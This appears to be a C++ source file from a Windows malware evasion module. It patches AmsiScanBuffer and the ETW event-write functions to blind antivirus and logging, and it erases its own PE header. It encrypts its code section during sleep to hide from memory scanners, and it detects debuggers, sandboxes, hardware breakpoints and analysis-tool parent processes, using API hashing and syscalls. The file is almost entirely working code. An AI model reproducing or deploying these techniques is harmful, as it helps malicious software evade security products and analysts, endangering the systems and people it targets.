//https://open.spotify.com/track/6iHCQZ4cXXbVKBhgyTRZ8h

#include <safety_utils/evasion.hpp>
#include <obfuscation/api_hash.hpp>
#include <obfuscation/syscall.hpp>
#include <windows.h>
#include <winternl.h>
#include <tlhelp32.h>
#include <intrin.h>

namespace evasion {

    void patch_amsi() {
        constexpr DWORD h_amsi = api_hash::hash(L"amsi.dll");
        HMODULE amsi = api_hash::get_module(h_amsi);
        if (!amsi) {
            char _name[] = {'a','m','s','i','.','d','l','l',0};
            amsi = (HMODULE)LoadLibraryA(_name);
        }
        if (!amsi) return;

        constexpr DWORD h_asb = api_hash::hash("AmsiScanBuffer");
        auto fn = (BYTE*)api_hash::get_proc(amsi, h_asb);
        if (!fn) return;

        PVOID  base = fn;
        SIZE_T sz   = 1;
        ULONG  old  = 0;
        nt_protect(GetCurrentProcess(), &base, &sz, PAGE_EXECUTE_READWRITE, &old);
        *fn = 0xC3;
        nt_protect(GetCurrentProcess(), &base, &sz, old, &old);
    }

    void wipe_pe_header() {
        //hoodmanager never had to deal with this.
        //https://www.youtube.com/watch?v=BhTNfU5yevM
        BYTE*  base = (BYTE*)GetModuleHandleW(nullptr);
        PVOID  p    = base;
        SIZE_T sz   = 0x1000;
        ULONG  old  = 0;
        nt_protect(GetCurrentProcess(), &p, &sz, PAGE_READWRITE, &old);
        SecureZeroMemory(base, 0x1000);
        nt_protect(GetCurrentProcess(), &p, &sz, old, &old);
    }

    static void patch_one_etw(HMODULE ntdll, DWORD fn_hash) {
        auto fn = (BYTE*)api_hash::get_proc(ntdll, fn_hash);
        if (!fn) return;
        PVOID  base = fn;
        SIZE_T sz   = 1;
        ULONG  old  = 0;
        nt_protect(GetCurrentProcess(), &base, &sz, PAGE_EXECUTE_READWRITE, &old);
        *fn = 0xC3;
        nt_protect(GetCurrentProcess(), &base, &sz, old, &old);
    }

    void patch_etw() {
        constexpr DWORD h_ntdll = api_hash::hash(L"ntdll.dll");
        HMODULE ntdll = api_hash::get_module(h_ntdll);
        if (!ntdll) return;

        //patch all ETW write entry points
        patch_one_etw(ntdll, api_hash::hash("EtwEventWrite"));
        patch_one_etw(ntdll, api_hash::hash("EtwEventWriteFull"));
        patch_one_etw(ntdll, api_hash::hash("EtwEventWriteEx"));
        patch_one_etw(ntdll, api_hash::hash("EtwEventWriteNoRegistration"));
        patch_one_etw(ntdll, api_hash::hash("EtwEventWriteTransfer"));
    }

    bool is_debugged() {
        if (IsDebuggerPresent())
            return true;

        BYTE* peb = (BYTE*)__readgsqword(0x60);
        if (*(DWORD*)(peb + 0xBC) & 0x70)
            return true;

        return false;
    }

    bool is_sandbox_resolution() {
        //dumb people forget to resize their VMs
        return GetSystemMetrics(SM_CXSCREEN) < 800 || GetSystemMetrics(SM_CYSCREEN) < 600;
    }

    bool has_hw_breakpoints() {
        CONTEXT ctx{};
        ctx.ContextFlags = CONTEXT_DEBUG_REGISTERS;
        if (!GetThreadContext(GetCurrentThread(), &ctx))
            return false;
        return ctx.Dr0 != 0 || ctx.Dr1 != 0 || ctx.Dr2 != 0 || ctx.Dr3 != 0;
    }

    bool is_kernel_debugger() {
        typedef NTSTATUS (WINAPI* pfn_NtQSI)(ULONG, PVOID, ULONG, PULONG);
        constexpr DWORD h_ntdll = api_hash::hash(L"ntdll.dll");
        constexpr DWORD h_nqsi  = api_hash::hash("NtQuerySystemInformation");
        auto fn = (pfn_NtQSI)api_hash::get_proc(api_hash::get_module(h_ntdll), h_nqsi);
        if (!fn) return false;

        struct { BOOLEAN Enabled; BOOLEAN NotPresent; } info{};
        //SystemKernelDebuggerInformation = 35
        fn(35, &info, sizeof(info), nullptr);
        return info.Enabled && !info.NotPresent;
    }

    //XOR encrypts .text and sets it NOACCESS for the sleep window
    //do_sleep lives in .crypt so it can still run while .text is inaccessible
    [[gnu::section(".crypt")]]
    static void do_sleep(BYTE* text_base, SIZE_T text_sz, DWORD key, DWORD ms) {
        PVOID  p   = text_base;
        SIZE_T sz  = text_sz;
        ULONG  old = 0;
        nt_protect_crypt(GetCurrentProcess(), &p, &sz, PAGE_EXECUTE_READWRITE, &old);
        for (SIZE_T i = 0; i + 3 < text_sz; i += 4)
            *(DWORD*)(text_base + i) ^= key;
        nt_protect_crypt(GetCurrentProcess(), &p, &sz, PAGE_NOACCESS, &old);

        Sleep(ms); //kernel32, not .text, safe to call while .text is NOACCESS

        nt_protect_crypt(GetCurrentProcess(), &p, &sz, PAGE_EXECUTE_READWRITE, &old);
        for (SIZE_T i = 0; i + 3 < text_sz; i += 4)
            *(DWORD*)(text_base + i) ^= key;
        nt_protect_crypt(GetCurrentProcess(), &p, &sz, old, &old);
    }

    [[gnu::section(".crypt")]]
    void obfuscated_sleep(DWORD ms) {
        BYTE* base = (BYTE*)GetModuleHandleW(nullptr);
        auto  dos  = (PIMAGE_DOS_HEADER)base;
        auto  nt   = (PIMAGE_NT_HEADERS)(base + dos->e_lfanew);
        auto  sec  = IMAGE_FIRST_SECTION(nt);
        for (WORD i = 0; i < nt->FileHeader.NumberOfSections; i++, sec++) {
            if (memcmp(sec->Name, ".text\0\0\0", 8) != 0) continue;
            do_sleep(base + sec->VirtualAddress, sec->SizeOfRawData, GetTickCount(), ms);
            return;
        }
        Sleep(ms); //fallback if section walk fails
    }

    bool is_debugger_parent() {
        typedef NTSTATUS (WINAPI* pfn_NtQIP)(HANDLE, PROCESSINFOCLASS, PVOID, ULONG, PULONG);
        constexpr DWORD h_ntdll = api_hash::hash(L"ntdll.dll");
        constexpr DWORD h_nqip  = api_hash::hash("NtQueryInformationProcess");
        auto fn = (pfn_NtQIP)api_hash::get_proc(api_hash::get_module(h_ntdll), h_nqip);
        if (!fn) return false;

        PROCESS_BASIC_INFORMATION pbi{};
        fn(GetCurrentProcess(), ProcessBasicInformation, &pbi, sizeof(pbi), nullptr);
        DWORD ppid = (DWORD)(ULONG_PTR)pbi.InheritedFromUniqueProcessId;

        //wont do shit anyw
        static constexpr DWORD bad_parents[] = {
            api_hash::hash("x64dbg.exe"),       api_hash::hash("x32dbg.exe"),
            api_hash::hash("ollydbg.exe"),       api_hash::hash("ida64.exe"),
            api_hash::hash("ida.exe"),           api_hash::hash("idaq64.exe"),
            api_hash::hash("idaq.exe"),          api_hash::hash("windbg.exe"),
            api_hash::hash("immunitydebugger.exe"), //immunity.digital?!
            api_hash::hash("cheatengine-x86_64.exe"),
            api_hash::hash("ghidra.exe"),        api_hash::hash("dnspy.exe"),
        };

        HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
        if (snap == INVALID_HANDLE_VALUE) return false;

        bool found = false;
        PROCESSENTRY32W pe{ .dwSize = sizeof(pe) };
        for (BOOL ok = Process32FirstW(snap, &pe); ok && !found; ok = Process32NextW(snap, &pe)) {
            if (pe.th32ProcessID != ppid) continue;
            char name[MAX_PATH]{};
            WideCharToMultiByte(CP_ACP, 0, pe.szExeFile, -1, name, sizeof(name), nullptr, nullptr);
            DWORD h = api_hash::hash(name);
            for (DWORD bad : bad_parents)
                if (h == bad) { found = true; break; }
        }
        CloseHandle(snap);
        return found;
    }

}
